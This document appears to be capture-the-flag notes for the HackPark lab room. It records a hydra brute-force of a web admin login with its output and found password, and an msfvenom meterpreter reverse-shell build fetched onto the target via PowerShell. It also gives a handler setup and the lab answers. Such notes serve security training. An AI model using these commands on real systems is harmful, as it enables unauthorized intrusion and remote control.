# Notes for room HackPark

## Tasks

### Task 1 

Whats the name of the clown displayed on the homepage?

```
pennywise
```

### Task 2

What request type is the Windows website login form using?

```
POST
```

Guess a username, choose a password wordlist and gain credentials to a user account!

```
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.162.244 http-post-form "/Account/login.aspx?ReturnURL=/admin:__VIEWSTATE=XpP2UkNgGxw32%2FF2%2BYjElt5GwwgetPHJYxx2jhnVmRMSAdlvIsNjBLzTCfSCaKTdRF2HxFfuTPng%2FgKAVCnnbuHC54OqXeepcBJTEL9vrSDFmL1v6j363%2FbK8rIE0hPXU6iIGAy1NabubktHqG4k7qdabnDqH435Y6bAcSjb1qFHniyG0LgwyVttpXNl2xfRLwH98RoHTBglJBCcKRZbXxNlcTS7%2FTl4puWb%2BU1WY4wyAwUUpRexPwEpCB5xk0i8AaqtV%2BPUgwqQnsqKTlfOAwvJlUO6A4jCryas8Ou2DMZNvWZlPAbbBAAS9g8uA2CwpPrHuVjeDwW8sJKSo%2B9qgG5vEjG4lrtu%2BtgzQaSnO2xtYo%2Bz&__EVENTVALIDATION=%2BzWsyYDSxPTekwgchmw7FY0ZJ%2F%2Fl57Y2FmwqE2H6UOhR3DMN6Jwf5exxI2ImOPaebX5wlSkjhhNoV0n3Zi9YyXXZQGPDrdAedmR5wOgeyDvwiVAgodJTdae2ECGrZEr6ntn65oukIJyq2jWJ8mOXF7GD2KJy06shnmM%2F5niEDWC39cOP&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login Failed" -vv
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-09-09 06:36:40
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking http-post-form://10.10.162.244:80/Account/login.aspx?ReturnURL=/admin:__VIEWSTATE=XpP2UkNgGxw32%2FF2%2BYjElt5GwwgetPHJYxx2jhnVmRMSAdlvIsNjBLzTCfSCaKTdRF2HxFfuTPng%2FgKAVCnnbuHC54OqXeepcBJTEL9vrSDFmL1v6j363%2FbK8rIE0hPXU6iIGAy1NabubktHqG4k7qdabnDqH435Y6bAcSjb1qFHniyG0LgwyVttpXNl2xfRLwH98RoHTBglJBCcKRZbXxNlcTS7%2FTl4puWb%2BU1WY4wyAwUUpRexPwEpCB5xk0i8AaqtV%2BPUgwqQnsqKTlfOAwvJlUO6A4jCryas8Ou2DMZNvWZlPAbbBAAS9g8uA2CwpPrHuVjeDwW8sJKSo%2B9qgG5vEjG4lrtu%2BtgzQaSnO2xtYo%2Bz&__EVENTVALIDATION=%2BzWsyYDSxPTekwgchmw7FY0ZJ%2F%2Fl57Y2FmwqE2H6UOhR3DMN6Jwf5exxI2ImOPaebX5wlSkjhhNoV0n3Zi9YyXXZQGPDrdAedmR5wOgeyDvwiVAgodJTdae2ECGrZEr6ntn65oukIJyq2jWJ8mOXF7GD2KJy06shnmM%2F5niEDWC39cOP&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login Failed
[VERBOSE] Resolving addresses ... [VERBOSE] resolving done
[VERBOSE] Page redirected to http://10.10.162.244/admin
[80][http-post-form] host: 10.10.162.244   login: admin   password: 1qaz2wsx
[STATUS] attack finished for 10.10.162.244 (waiting for children to complete tests)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-09-09 06:37:2

```

### Task 3 

Now you have logged into the website, are you able to identify the version of the BlogEngine?

```
3.3.6.0

```

What is the CVE?

```
CVE-2019-6714
```

Who is the webserver running as?

```
iis apppool\blog
```

### Task 4

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.9.1.5 LPORT=9001 -f exe > shell.exe

python3 -m http.server
```
ON TARGET:

```
powershell -c "Invoke-WebRequest -Uri 'http://10.9.1.5:8000/shell.exe' -OutFile 'C:\Windows\Temp\shell.exe'"


```

ON HOST AGAIN: 
```
Go to msfconsole

use multi/handler

set PAYLOAD as windows/meterpreter/reverse_tcp

set LHOST

set LPORT

run

```

